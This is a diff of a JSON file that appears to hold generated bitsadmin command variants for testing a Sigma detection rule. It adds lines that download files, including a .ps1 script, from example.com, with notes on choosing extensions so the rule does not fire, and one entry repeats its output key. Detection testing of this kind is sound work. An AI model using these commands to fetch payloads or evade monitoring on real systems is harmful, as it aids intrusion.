@@ -1,6 +1,15 @@
 [
   {
-    "output": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\thaim\\AppData\\Local\\Temp\\Atomic-license.txt",
-    "explanation": "No safe bypass command can be generated."
+    "output": "bitsadmin.exe /addfile TestJob https://example.com/testfile.ps1 C:\\Users\\test\\Downloads\\testfile.ps1",
+    "explanation": "This command uses the same structure as the true positive but replaces the URL and file path with benign values. It uses the /addfile flag, which is part of the Sigma rule's detection criteria. This is a safe mutation using substitution and omission techniques."
+  },
+  {
+    "output": "bitsadmin.exe /transfer DownloadJob /Download /priority Foreground https://example.com/testfile.txt C:\\Users\\test\\Downloads\\testfile.txt",
+    "output": "bitsadmin.exe /transfer DownloadJob /Download /priority Foreground https://example.com/testfile.txt C:\\Users\\test\\Downloads\\testfile.txt",
+    "explanation": "This command uses the /transfer flag with a benign file extension (.txt) to avoid triggering the suspicious extension condition in the Sigma rule. It is a safe mutation using substitution and omission techniques."
+  },
+  {
+    "output": "bitsadmin.exe /transfer JobName /Priority HIGH https://example.com/testfile.png C:\\Users\\test\\Downloads\\testfile.png",
+    "explanation": "This command uses the /transfer flag with a non-malicious file extension (.png) to avoid detection. It is a safe mutation using substitution and omission techniques."
   }
 ]
